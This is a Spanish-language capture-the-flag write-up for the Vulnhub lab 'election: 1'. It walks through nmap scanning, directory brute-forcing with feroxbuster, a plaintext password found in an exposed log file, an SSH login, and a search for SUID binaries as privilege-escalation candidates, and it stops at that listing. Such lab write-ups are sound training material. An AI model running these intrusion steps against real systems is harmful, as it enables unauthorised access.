+++
title = "election: 1 - Vulnhub"
+++

[link => election: 1](https://www.vulnhub.com/entry/election-1,503/)

---

## Escaneo de red con nmap para descubrir máquina objetivo

```bash
nmap -sn 10.38.1.0/24
```

![nmaphd](/images/writeups/vulnhub/election1/nmaphd.png)

### La IP de la máquina objetivo es **10.38.1.13**

## Escaneo de la máquina objetivo en busca de puertos abiertos

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.38.1.13 -oN target_scan.nmap
```

```bash
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: target_scan.nmap
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.94SVN scan initiated Mon Oct 14 10:53:22 2024 as: nmap -p- --open -sS --min-rate 5000 -vvv -n
       │  -Pn -oN target_scan.nmap 10.38.1.13
   2   │ Nmap scan report for 10.38.1.13
   3   │ Host is up, received arp-response (0.00019s latency).
   4   │ Scanned at 2024-10-14 10:53:23 EDT for 2s
   5   │ Not shown: 65533 closed tcp ports (reset)
   6   │ PORT   STATE SERVICE REASON
   7   │ 22/tcp open  ssh     syn-ack ttl 64
   8   │ 80/tcp open  http    syn-ack ttl 64
   9   │ MAC Address: 08:00:27:E1:55:67 (Oracle VirtualBox virtual NIC)
  10   │ 
  11   │ Read data files from: /usr/bin/../share/nmap
  12   │ # Nmap done at Mon Oct 14 10:53:25 2024 -- 1 IP address (1 host up) scanned in 2.57 seconds
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────
```

### **Puertos Abiertos: 22,80**

## Ejecución de scripts con nmap

```bash
sudo nmap -sCV -p22,80 10.38.1.13 -oN scripts_exec.nmap
```

```bash
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: scripts_exec.nmap
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.94SVN scan initiated Mon Oct 14 10:55:44 2024 as: nmap -sCV -p22,80 -oN scripts_exec.nmap 10.
       │ 38.1.13
   2   │ Nmap scan report for 10.38.1.13
   3   │ Host is up (0.00063s latency).
   4   │ 
   5   │ PORT   STATE SERVICE VERSION
   6   │ 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
   7   │ | ssh-hostkey: 
   8   │ |   2048 20:d1:ed:84:cc:68:a5:a7:86:f0:da:b8:92:3f:d9:67 (RSA)
   9   │ |   256 78:89:b3:a2:75:12:76:92:2a:f9:8d:27:c1:08:a7:b9 (ECDSA)
  10   │ |_  256 b8:f4:d6:61:cf:16:90:c5:07:18:99:b0:7c:70:fd:c0 (ED25519)
  11   │ 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
  12   │ |_http-title: Apache2 Ubuntu Default Page: It works
  13   │ |_http-server-header: Apache/2.4.29 (Ubuntu)
  14   │ MAC Address: 08:00:27:E1:55:67 (Oracle VirtualBox virtual NIC)
  15   │ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  16   │ 
  17   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  18   │ # Nmap done at Mon Oct 14 10:56:05 2024 -- 1 IP address (1 host up) scanned in 20.35 seconds
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────
```

## Enumeración de directorios de manera recursiva con feroxbuster

```bash
feroxbuster -u http://10.38.1.13/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -d 0 -o fuzzing.txt
```

```bash
Configuration {
    kind: "configuration",
    wordlist: "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt",
    config: "",
    proxy: "",
    replay_proxy: "",
    server_certs: [],
    client_cert: "",
    client_key: "",
    target_url: "http://10.38.1.13/",
    status_codes: [
        100,
        101,
        102,
        200,
        201,
        202,
        203,
        204,
        205,
        206,
        207,
        208,
        226,
        300,
        301,
        302,
        303,
        304,
        305,
        307,
        308,
        400,
        401,
        402,
        403,
        404,
        405,
        406,
        407,
        408,
        409,
        410,
        411,
        412,
        413,
        414,
        415,
        416,
        417,
        418,
        421,
        422,
        423,
        424,
        426,
        428,
        429,
        431,
        451,
        500,
        501,
        502,
        503,
        504,
        505,
        506,
        507,
        508,
        510,
        511,
        103,
        425,
    ],
    replay_codes: [
        100,
        101,
        102,
        200,
        201,
        202,
        203,
        204,
        205,
        206,
        207,
        208,
        226,
        300,
        301,
        302,
        303,
        304,
        305,
        307,
        308,
        400,
        401,
        402,
        403,
        404,
        405,
        406,
        407,
        408,
        409,
        410,
        411,
        412,
        413,
        414,
        415,
        416,
        417,
        418,
        421,
        422,
        423,
        424,
        426,
        428,
        429,
        431,
        451,
        500,
        501,
        502,
        503,
        504,
        505,
        506,
        507,
        508,
        510,
        511,
        103,
        425,
    ],
    filter_status: [],
    client: Client {
        accepts: Accepts,
        proxies: [
            Proxy(
                System(
                    {},
                ),
                None,
            ),
        ],
        redirect_policy: Policy(
            None,
        ),
        referer: true,
        default_headers: {
            "accept": "*/*",
            "user-agent": "feroxbuster/2.11.0",
        },
        timeout: 7s,
    },
    replay_client: None,
    threads: 50,
    timeout: 7,
    verbosity: 0,
    silent: false,
    quiet: false,
    output_level: Default,
    auto_bail: false,
    auto_tune: false,
    requester_policy: Default,
    json: false,
    output: "fuzzing.txt",
    debug_log: "",
    user_agent: "feroxbuster/2.11.0",
    random_agent: false,
    redirects: false,
    insecure: false,
    extensions: [],
    methods: [
        "GET",
    ],
    data: [],
    headers: {},
    queries: [],
    no_recursion: false,
    extract_links: true,
    add_slash: false,
    stdin: false,
    depth: 0,
    scan_limit: 0,
    parallel: 0,
    rate_limit: 0,
    filter_size: [],
    filter_line_count: [],
    filter_word_count: [],
    filter_regex: [],
    dont_filter: false,
    resumed: false,
    resume_from: "",
    save_state: true,
    time_limit: "",
    filter_similar: [],
    url_denylist: [],
    regex_denylist: [],
    collect_extensions: false,
    dont_collect: [
        "tif",
        "tiff",
        "ico",
        "cur",
        "bmp",
        "webp",
        "svg",
        "png",
        "jpg",
        "jpeg",
        "jfif",
        "gif",
        "avif",
        "apng",
        "pjpeg",
        "pjp",
        "mov",
        "wav",
        "mpg",
        "mpeg",
        "mp3",
        "mp4",
        "m4a",
        "m4p",
        "m4v",
        "ogg",
        "webm",
        "ogv",
        "oga",
        "flac",
        "aac",
        "3gp",
        "css",
        "zip",
        "xls",
        "xml",
        "gz",
        "tgz",
    ],
    collect_backups: false,
    backup_extensions: [
        "~",
        ".bak",
        ".bak2",
        ".old",
        ".1",
    ],
    collect_words: false,
    force_recursion: false,
    update_app: false,
    scan_dir_listings: false,
    request_file: "",
    protocol: "https",
    limit_bars: 0,
}
301      GET        9l       28w      313c http://10.38.1.13/javascript => http://10.38.1.13/javascript/
200      GET       15l       74w     6147c http://10.38.1.13/icons/ubuntu-logo.png
301      GET        9l       28w      311c http://10.38.1.13/election => http://10.38.1.13/election/
200      GET      375l      964w    10918c http://10.38.1.13/
301      GET        9l       28w      318c http://10.38.1.13/election/themes => http://10.38.1.13/election/themes/
MSG      0.000 feroxbuster::heuristics detected directory listing: http://10.38.1.13/election/themes (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://10.38.1.13/election/themes/shards (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://10.38.1.13/election/data (Apache)
500      GET        7l       12w      151c http://10.38.1.13/election/themes/shards/home.php
MSG      0.000 feroxbuster::heuristics detected directory listing: http://10.38.1.13/election/themes/shards/js (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://10.38.1.13/election/themes/shards/img (Apache)
301      GET        9l       28w      316c http://10.38.1.13/election/data => http://10.38.1.13/election/data/
200      GET       22l      149w     8055c http://10.38.1.13/election/themes/shards/img/tripath-logo.png
200      GET        5l      347w    19038c http://10.38.1.13/election/themes/shards/js/popper.min.js
500      GET       10l       26w      358c http://10.38.1.13/election/themes/shards/election.php
200      GET        6l      590w    51150c http://10.38.1.13/election/themes/shards/js/bootstrap.min.js
200      GET      117l      442w     3121c http://10.38.1.13/election/themes/shards/js/jquery.cookie.js
200      GET      404l     1175w    16827c http://10.38.1.13/election/themes/shards/js/bootstrap-notify.js
301      GET        9l       28w      317c http://10.38.1.13/election/admin => http://10.38.1.13/election/admin/
200      GET        1l     1053w    56453c http://10.38.1.13/election/themes/shards/js/shards.min.js
200      GET        1l     6137w   307810c http://10.38.1.13/election/themes/shards/js/moment.min.js
MSG      0.000 feroxbuster::heuristics detected directory listing: http://10.38.1.13/election/admin/css (Apache)
301      GET        9l       28w      321c http://10.38.1.13/election/admin/css => http://10.38.1.13/election/admin/css/
200      GET      637l     1417w    13647c http://10.38.1.13/election/admin/css/material-tripath.css
MSG      0.000 feroxbuster::heuristics detected directory listing: http://10.38.1.13/election/admin/plugins (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://10.38.1.13/election/admin/plugins/Zebra_Image (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://10.38.1.13/election/admin/plugins/excel-importer (Apache)
200      GET        0l        0w        0c http://10.38.1.13/election/admin/plugins/excel-importer/SpreadsheetReader.php
200      GET        0l        0w        0c http://10.38.1.13/election/admin/plugins/Zebra_Image/Zebra_Image.php
200      GET        0l        0w        0c http://10.38.1.13/election/admin/plugins/excel-importer/SpreadsheetReader_XLSX.php
MSG      0.000 feroxbuster::heuristics detected directory listing: http://10.38.1.13/election/admin/plugins/excel-importer/php-excel-reader (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://10.38.1.13/election/admin/plugins/excel-importer/sample (Apache)
200      GET     6780l    14744w   165243c http://10.38.1.13/election/admin/css/material-dashboard.css
200      GET        0l        0w        0c http://10.38.1.13/election/admin/plugins/excel-importer/executor.php
200      GET      192l      449w     3648c http://10.38.1.13/election/admin/css/style.css
200      GET        0l        0w        0c http://10.38.1.13/election/admin/plugins/excel-importer/SpreadsheetReader_XLS.php
500      GET        4l       10w      201c http://10.38.1.13/election/admin/plugins/excel-importer/addons.php
MSG      0.000 feroxbuster::heuristics detected directory listing: http://10.38.1.13/election/admin/plugins/excel-importer/SimpleExcel (Apache)
200      GET     1579l     2856w    23848c http://10.38.1.13/election/admin/css/animate.css
200      GET        0l        0w        0c http://10.38.1.13/election/admin/plugins/excel-importer/php-excel-reader/excel_reader2.php
200      GET        0l        0w        0c http://10.38.1.13/election/admin/plugins/excel-importer/SimpleExcel/SimpleExcel.php
MSG      0.000 feroxbuster::heuristics detected directory listing: http://10.38.1.13/election/admin/plugins/excel-importer/SimpleExcel/Writer (Apache)
500      GET        0l        0w        0c http://10.38.1.13/election/admin/plugins/excel-importer/SimpleExcel/Writer/XMLWriter.php
200      GET        0l        0w        0c http://10.38.1.13/election/admin/plugins/excel-importer/SimpleExcel/Writer/IWriter.php
500      GET        0l        0w        0c http://10.38.1.13/election/admin/plugins/excel-importer/SimpleExcel/Writer/HTMLWriter.php
500      GET        0l        0w        0c http://10.38.1.13/election/admin/plugins/excel-importer/SimpleExcel/Writer/JSONWriter.php
500      GET        0l        0w        0c http://10.38.1.13/election/admin/plugins/excel-importer/SimpleExcel/Writer/CSVWriter.php
200      GET      261l     1118w    62890c http://10.38.1.13/election/admin/plugins/excel-importer/sample/impor_siswa.xls
500      GET        0l        0w        0c http://10.38.1.13/election/admin/plugins/excel-importer/SimpleExcel/Writer/TSVWriter.php
200      GET      261l     1118w    62822c http://10.38.1.13/election/admin/plugins/excel-importer/sample/impor_guru.xls
301      GET        9l       28w      315c http://10.38.1.13/election/lib => http://10.38.1.13/election/lib/
MSG      0.000 feroxbuster::heuristics detected directory listing: http://10.38.1.13/election/lib (Apache)
200      GET        0l        0w        0c http://10.38.1.13/election/lib/homeAPI.php
MSG      0.000 feroxbuster::heuristics detected directory listing: http://10.38.1.13/election/js (Apache)
301      GET        9l       28w      314c http://10.38.1.13/election/js => http://10.38.1.13/election/js/
200      GET       24l       75w      698c http://10.38.1.13/election/js/tripath.localization.js
301      GET        9l       28w      317c http://10.38.1.13/election/media => http://10.38.1.13/election/media/
200      GET        5l       15w      116c http://10.38.1.13/election/themes/shards/info.tp
MSG      0.000 feroxbuster::heuristics detected directory listing: http://10.38.1.13/election/themes/shards/css (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://10.38.1.13/election/themes/shards/fonts (Apache)
200      GET     1579l     2856w    23848c http://10.38.1.13/election/themes/shards/css/animate.css
200      GET        2l     1733w    77789c http://10.38.1.13/election/themes/shards/css/shards.min.css
200      GET      476l     1078w     9412c http://10.38.1.13/election/themes/shards/css/shards.tripath.css
200      GET        7l     1258w   124970c http://10.38.1.13/election/themes/shards/css/bootstrap.min.css
200      GET        4l       66w    31004c http://10.38.1.13/election/themes/shards/css/font-awesome.min.css
200      GET        1l        1w      775c http://10.38.1.13/election/themes/shards/css/reset.min.css
200      GET       19l      132w     8750c http://10.38.1.13/election/themes/shards/img/eLection-logo.png
200      GET      288l     1759w   139600c http://10.38.1.13/election/themes/shards/fonts/fontawesome-webfont.woff2
MSG      0.000 feroxbuster::heuristics detected directory listing: http://10.38.1.13/election/admin/ajax (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://10.38.1.13/election/admin/js (Apache)
200      GET     1452l     5977w   212322c http://10.38.1.13/election/themes/shards/fonts/fontawesome-webfont.ttf
200      GET        4l     1298w    86663c http://10.38.1.13/election/themes/shards/js/jquery-3.2.1.min.js
200      GET       66l      131w     1790c http://10.38.1.13/election/themes/shards/js/eLection.js
301      GET        9l       28w      322c http://10.38.1.13/election/admin/ajax => http://10.38.1.13/election/admin/ajax/
200      GET        1l        2w       15c http://10.38.1.13/election/admin/ajax/login.php
200      GET        1l        2w       15c http://10.38.1.13/election/admin/ajax/pemilihan.php
200      GET        1l        2w       15c http://10.38.1.13/election/admin/ajax/op_akun.php
200      GET        1l        2w       15c http://10.38.1.13/election/admin/ajax/op_relate.php
200      GET        1l        2w       15c http://10.38.1.13/election/admin/ajax/hakpilih.php
200      GET        1l        2w       15c http://10.38.1.13/election/admin/ajax/op_pengaturan.php
200      GET        1l        2w       15c http://10.38.1.13/election/admin/ajax/op_siswa.php
200      GET        1l        5w       47c http://10.38.1.13/election/admin/ajax/op_updater.php
200      GET        1l        2w       15c http://10.38.1.13/election/admin/ajax/op_guru.php
200      GET        1l        2w       15c http://10.38.1.13/election/admin/ajax/op_kandidat_foto.php
301      GET        9l       28w      320c http://10.38.1.13/election/admin/js => http://10.38.1.13/election/admin/js/
200      GET        8l      217w    15226c http://10.38.1.13/election/admin/js/jquery.uploadfile.min.js
200      GET        6l       75w     5170c http://10.38.1.13/election/admin/js/jquery.flip.min.js
200      GET      264l      636w     7704c http://10.38.1.13/election/admin/js/material-dashboard.js
200      GET      146l      231w     3610c http://10.38.1.13/election/admin/js/index.js
200      GET       24l       47w      660c http://10.38.1.13/election/admin/js/tripath-continous-insert.js
200      GET       10l       95w     5091c http://10.38.1.13/election/admin/js/arrive.min.js
200      GET        2l      301w    25332c http://10.38.1.13/election/admin/js/perfect-scrollbar.jquery.min.js
200      GET      117l      442w     3121c http://10.38.1.13/election/admin/js/jquery.cookie.js
200      GET       94l      232w     3040c http://10.38.1.13/election/admin/js/tripath-json.js
200      GET      255l      885w     9949c http://10.38.1.13/election/admin/js/jquery.print.js
200      GET      404l     1175w    16827c http://10.38.1.13/election/admin/js/bootstrap-notify.js
200      GET        1l       94w     8137c http://10.38.1.13/election/admin/js/material.min.js
200      GET      721l    62159w   440109c http://10.38.1.13/election/themes/shards/fonts/fontawesome-webfont.svg
200      GET     1277l     4695w    43892c http://10.38.1.13/election/admin/js/jquery.form.js
301      GET        9l       28w      328c http://10.38.1.13/election/admin/components => http://10.38.1.13/election/admin/components/
MSG      0.000 feroxbuster::heuristics detected directory listing: http://10.38.1.13/election/admin/components (Apache)
200      GET       14l       44w      689c http://10.38.1.13/election/admin/components/bottom_script.php
500      GET        9l       44w      423c http://10.38.1.13/election/admin/components/nav.php
500      GET       14l       23w      702c http://10.38.1.13/election/admin/components/footer.php
200      GET       16l       61w      954c http://10.38.1.13/election/admin/components/header.php
500      GET       12l       36w      580c http://10.38.1.13/election/admin/components/modals.php
200      GET        1l      498w     3985c http://10.38.1.13/election/admin/components/nice-background.php
200      GET        6l       14w      364c http://10.38.1.13/election/admin/components/navbar_header.php
200      GET        4l     1298w    86659c http://10.38.1.13/election/admin/js/jquery-3.2.1.min.js
200      GET        5l       43w     1268c http://10.38.1.13/election/admin/js/jquery.animatecss.min.js
301      GET        9l       28w      321c http://10.38.1.13/election/admin/img => http://10.38.1.13/election/admin/img/
MSG      0.000 feroxbuster::heuristics detected directory listing: http://10.38.1.13/election/admin/img (Apache)
200      GET        1l     6137w   307810c http://10.38.1.13/election/admin/js/moment.min.js
200      GET        9l      519w    36026c http://10.38.1.13/election/admin/js/chartist.min.js
MSG      0.000 feroxbuster::heuristics detected directory listing: http://10.38.1.13/election/admin/inc (Apache)
301      GET        9l       28w      321c http://10.38.1.13/election/admin/inc => http://10.38.1.13/election/admin/inc/
200      GET        0l        0w        0c http://10.38.1.13/election/admin/inc/check_ajax.php
200      GET        0l        0w        0c http://10.38.1.13/election/admin/inc/conn.php
200      GET        0l        0w        0c http://10.38.1.13/election/admin/inc/functions.php
MSG      0.000 feroxbuster::heuristics detected directory listing: http://10.38.1.13/election/admin/logs (Apache)
301      GET        9l       28w      322c http://10.38.1.13/election/admin/logs => http://10.38.1.13/election/admin/logs/
200      GET      483l     2446w   185317c http://10.38.1.13/election/admin/img/sidebar-4.jpg
301      GET        9l       28w      325c http://10.38.1.13/election/admin/plugins => http://10.38.1.13/election/admin/plugins/
200      GET      106l      236w     2223c http://10.38.1.13/election/admin/css/tripath-tiles.css
301      GET        9l       28w      313c http://10.38.1.13/phpmyadmin => http://10.38.1.13/phpmyadmin/
200      GET      345l     2225w   204291c http://10.38.1.13/election/admin/img/sidebar-3.jpg
301      GET        9l       28w      320c http://10.38.1.13/phpmyadmin/themes => http://10.38.1.13/phpmyadmin/themes/
301      GET        9l       28w      317c http://10.38.1.13/phpmyadmin/doc => http://10.38.1.13/phpmyadmin/doc/
200      GET      259l     1244w   105253c http://10.38.1.13/election/admin/img/sidebar-2.jpg
301      GET        9l       28w      322c http://10.38.1.13/phpmyadmin/doc/html => http://10.38.1.13/phpmyadmin/doc/html/
200      GET      415l     2250w   179691c http://10.38.1.13/election/admin/img/sidebar-1.jpg
500      GET        0l        0w        0c http://10.38.1.13/election/admin/plugins/excel-importer/SimpleExcel/Writer/BaseWriter.php
500      GET        0l        0w        0c http://10.38.1.13/election/admin/plugins/excel-importer/SimpleExcel/Writer/XLSXWriter.php
MSG      0.000 feroxbuster::heuristics detected directory listing: http://10.38.1.13/election/admin/plugins/excel-importer/SimpleExcel/Parser (Apache)
500      GET        0l        0w        0c http://10.38.1.13/election/admin/plugins/excel-importer/SimpleExcel/Parser/HTMLParser.php
500      GET        0l        0w        0c http://10.38.1.13/election/admin/plugins/excel-importer/SimpleExcel/Parser/XMLParser.php
500      GET        0l        0w        0c http://10.38.1.13/election/admin/plugins/excel-importer/SimpleExcel/Parser/TSVParser.php
500      GET        0l        0w        0c http://10.38.1.13/election/admin/plugins/excel-importer/SimpleExcel/Parser/XLSXParser.php
500      GET        0l        0w        0c http://10.38.1.13/election/admin/plugins/excel-importer/SimpleExcel/Parser/JSONParser.php
200      GET        0l        0w        0c http://10.38.1.13/election/admin/plugins/excel-importer/SimpleExcel/Parser/IParser.php
301      GET        9l       28w      330c http://10.38.1.13/phpmyadmin/doc/html/_images => http://10.38.1.13/phpmyadmin/doc/html/_images/
MSG      0.000 feroxbuster::heuristics detected directory listing: http://10.38.1.13/election/media (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://10.38.1.13/election/languages (Apache)
200      GET       24l      233w    12280c http://10.38.1.13/election/media/user.png
200      GET        1l        1w        4c http://10.38.1.13/election/languages/localize.php
MSG      0.000 feroxbuster::heuristics detected directory listing: http://10.38.1.13/election/media/panitia (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://10.38.1.13/election/media/backgrounds (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://10.38.1.13/election/media/cache (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://10.38.1.13/election/languages/en-us (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://10.38.1.13/election/languages/id-id (Apache)
200      GET       26l      109w    10366c http://10.38.1.13/election/media/backgrounds/codename-logo.png
200      GET       35l      201w     2186c http://10.38.1.13/election/languages/en-us/loc_plugin_excel_importer.tp
200      GET        9l       19w      243c http://10.38.1.13/election/languages/id-id/info.tp
200      GET       80l      429w     4390c http://10.38.1.13/election/languages/en-us/loc_ajax.tp
200      GET       42l       75w      854c http://10.38.1.13/election/languages/en-us/loc_functions.tp
200      GET       44l      211w     1986c http://10.38.1.13/election/languages/en-us/loc_main.tp
200      GET      233l      855w     9968c http://10.38.1.13/election/languages/en-us/loc_admin.tp
200      GET        9l       20w      246c http://10.38.1.13/election/languages/en-us/info.tp
200      GET      234l      878w    10543c http://10.38.1.13/election/languages/id-id/loc_admin.tp
200      GET       43l      211w     2134c http://10.38.1.13/election/languages/id-id/loc_main.tp
200      GET       74l      408w     4517c http://10.38.1.13/election/languages/id-id/loc_ajax.tp
200      GET       37l       65w      713c http://10.38.1.13/election/languages/id-id/loc_functions.tp
200      GET       35l      201w     2351c http://10.38.1.13/election/languages/id-id/loc_plugin_excel_importer.tp
301      GET        9l       28w      316c http://10.38.1.13/phpmyadmin/js => http://10.38.1.13/phpmyadmin/js/
200      GET     1620l     8202w   740155c http://10.38.1.13/election/media/backgrounds/codename.jpg
200      GET       13l       22w      415c http://10.38.1.13/election/admin/js/tripath-form-control.js
200      GET        1l        2w       15c http://10.38.1.13/election/admin/ajax/registrasi.php
200      GET        1l        2w       15c http://10.38.1.13/election/admin/ajax/op_akun_foto.php
200      GET        1l        2w       15c http://10.38.1.13/election/admin/ajax/op_panitia.php
200      GET        7l      432w    37045c http://10.38.1.13/election/admin/js/bootstrap.min.js
200      GET        3l       28w      205c http://10.38.1.13/election/admin/logs/system.log
401      GET       14l       54w      457c http://10.38.1.13/phpmyadmin/setup
301      GET        9l       28w      321c http://10.38.1.13/election/languages => http://10.38.1.13/election/languages/
MSG      0.000 feroxbuster::heuristics detected directory listing: http://10.38.1.13/election/media/kandidat (Apache)
301      GET        9l       28w      317c http://10.38.1.13/phpmyadmin/sql => http://10.38.1.13/phpmyadmin/sql/
301      GET        9l       28w      320c http://10.38.1.13/phpmyadmin/locale => http://10.38.1.13/phpmyadmin/locale/
301      GET        9l       28w      323c http://10.38.1.13/phpmyadmin/locale/de => http://10.38.1.13/phpmyadmin/locale/de/
301      GET        9l       28w      323c http://10.38.1.13/phpmyadmin/locale/fr => http://10.38.1.13/phpmyadmin/locale/fr/
301      GET        9l       28w      323c http://10.38.1.13/phpmyadmin/locale/it => http://10.38.1.13/phpmyadmin/locale/it/
301      GET        9l       28w      323c http://10.38.1.13/phpmyadmin/locale/nl => http://10.38.1.13/phpmyadmin/locale/nl/
301      GET        9l       28w      323c http://10.38.1.13/phpmyadmin/locale/uk => http://10.38.1.13/phpmyadmin/locale/uk/
301      GET        9l       28w      323c http://10.38.1.13/phpmyadmin/locale/es => http://10.38.1.13/phpmyadmin/locale/es/
301      GET        9l       28w      323c http://10.38.1.13/phpmyadmin/locale/cs => http://10.38.1.13/phpmyadmin/locale/cs/
301      GET        9l       28w      323c http://10.38.1.13/phpmyadmin/locale/id => http://10.38.1.13/phpmyadmin/locale/id/
301      GET        9l       28w      323c http://10.38.1.13/phpmyadmin/locale/tr => http://10.38.1.13/phpmyadmin/locale/tr/
301      GET        9l       28w      323c http://10.38.1.13/phpmyadmin/locale/ca => http://10.38.1.13/phpmyadmin/locale/ca/
301      GET        9l       28w      323c http://10.38.1.13/phpmyadmin/locale/ru => http://10.38.1.13/phpmyadmin/locale/ru/
301      GET        9l       28w      323c http://10.38.1.13/phpmyadmin/locale/pt => http://10.38.1.13/phpmyadmin/locale/pt/
301      GET        9l       28w      323c http://10.38.1.13/phpmyadmin/locale/ja => http://10.38.1.13/phpmyadmin/locale/ja/
301      GET        9l       28w      323c http://10.38.1.13/phpmyadmin/locale/bg => http://10.38.1.13/phpmyadmin/locale/bg/
301      GET        9l       28w      323c http://10.38.1.13/phpmyadmin/locale/pl => http://10.38.1.13/phpmyadmin/locale/pl/
301      GET        9l       28w      323c http://10.38.1.13/phpmyadmin/locale/hu => http://10.38.1.13/phpmyadmin/locale/hu/
301      GET        9l       28w      323c http://10.38.1.13/phpmyadmin/locale/vi => http://10.38.1.13/phpmyadmin/locale/vi/
301      GET        9l       28w      323c http://10.38.1.13/phpmyadmin/locale/fi => http://10.38.1.13/phpmyadmin/locale/fi/
301      GET        9l       28w      344c http://10.38.1.13/election/themes/shards/css/material-icons => http://10.38.1.13/election/themes/shards/css/material-icons/
301      GET        9l       28w      323c http://10.38.1.13/phpmyadmin/locale/gl => http://10.38.1.13/phpmyadmin/locale/gl/
301      GET        9l       28w      323c http://10.38.1.13/phpmyadmin/locale/si => http://10.38.1.13/phpmyadmin/locale/si/
301      GET        9l       28w      323c http://10.38.1.13/phpmyadmin/locale/da => http://10.38.1.13/phpmyadmin/locale/da/
301      GET        9l       28w      329c http://10.38.1.13/phpmyadmin/themes/original => http://10.38.1.13/phpmyadmin/themes/original/
301      GET        9l       28w      333c http://10.38.1.13/phpmyadmin/themes/original/img => http://10.38.1.13/phpmyadmin/themes/original/img/
301      GET        9l       28w      323c http://10.38.1.13/phpmyadmin/locale/sv => http://10.38.1.13/phpmyadmin/locale/sv/
301      GET        9l       28w      323c http://10.38.1.13/phpmyadmin/locale/nb => http://10.38.1.13/phpmyadmin/locale/nb/
301      GET        9l       28w      323c http://10.38.1.13/phpmyadmin/locale/sq => http://10.38.1.13/phpmyadmin/locale/sq/
301      GET        9l       28w      326c http://10.38.1.13/phpmyadmin/locale/en_GB => http://10.38.1.13/phpmyadmin/locale/en_GB/
301      GET        9l       28w      320c http://10.38.1.13/phpmyadmin/js/pmd => http://10.38.1.13/phpmyadmin/js/pmd/
301      GET        9l       28w      326c http://10.38.1.13/phpmyadmin/locale/pt_BR => http://10.38.1.13/phpmyadmin/locale/pt_BR/
301      GET        9l       28w      323c http://10.38.1.13/phpmyadmin/locale/hy => http://10.38.1.13/phpmyadmin/locale/hy/
301      GET        9l       28w      330c http://10.38.1.13/phpmyadmin/doc/html/_static => http://10.38.1.13/phpmyadmin/doc/html/_static/
301      GET        9l       28w      326c http://10.38.1.13/phpmyadmin/locale/zh_CN => http://10.38.1.13/phpmyadmin/locale/zh_CN/
301      GET        9l       28w      320c http://10.38.1.13/javascript/jquery => http://10.38.1.13/javascript/jquery/
301      GET        9l       28w      323c http://10.38.1.13/phpmyadmin/js/jquery => http://10.38.1.13/phpmyadmin/js/jquery/
301      GET        9l       28w      336c http://10.38.1.13/phpmyadmin/themes/original/jquery => http://10.38.1.13/phpmyadmin/themes/original/jquery/
301      GET        9l       28w      343c http://10.38.1.13/phpmyadmin/themes/original/jquery/images => http://10.38.1.13/phpmyadmin/themes/original/jquery/images/
200      GET    10253l    40948w   268026c http://10.38.1.13/javascript/jquery/jquery
```


## Credenciales encontradas en archivo system.log

```txt
Ruta -> 10.38.1.13/election/admin/logs/system.log
```

```bash
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: system.log
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ [2020-01-01 00:00:00] Assigned Password for the user love: P@$$w0rd@123
   2   │ [2020-04-03 00:13:53] Love added candidate 'Love'.
   3   │ [2020-04-08 19:26:34] Love has been logged in from Unknown IP on Firefox (Linux).
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────
```

## Conexión vía ssh con el usuario love

```txt
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: credentials
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ love: P@$$w0rd@123
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────
```

## Binarios con permisos SUID 

```bash
love@election:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/arping
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/traceroute6.iputils
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/sbin/pppd
/usr/local/Serv-U/Serv-U
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/xorg/Xorg.wrap
/bin/fusermount
/bin/ping
/bin/umount
/bin/mount
/bin/su
/snap/core/7917/bin/mount
/snap/core/7917/bin/ping
/snap/core/7917/bin/ping6
/snap/core/7917/bin/su
/snap/core/7917/bin/umount
/snap/core/7917/usr/bin/chfn
/snap/core/7917/usr/bin/chsh
/snap/core/7917/usr/bin/gpasswd
/snap/core/7917/usr/bin/newgrp
/snap/core/7917/usr/bin/passwd
/snap/core/7917/usr/bin/sudo
/snap/core/7917/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/7917/usr/lib/openssh/ssh-keysign
/snap/core/7917/usr/lib/snapd/snap-confine
/snap/core/7917/usr/sbin/pppd
/snap/core/7270/bin/mount
/snap/core/7270/bin/ping
/snap/core/7270/bin/ping6
/snap/core/7270/bin/su
/snap/core/7270/bin/umount
/snap/core/7270/usr/bin/chfn
/snap/core/7270/usr/bin/chsh
/snap/core/7270/usr/bin/gpasswd
/snap/core/7270/usr/bin/newgrp
/snap/core/7270/usr/bin/passwd
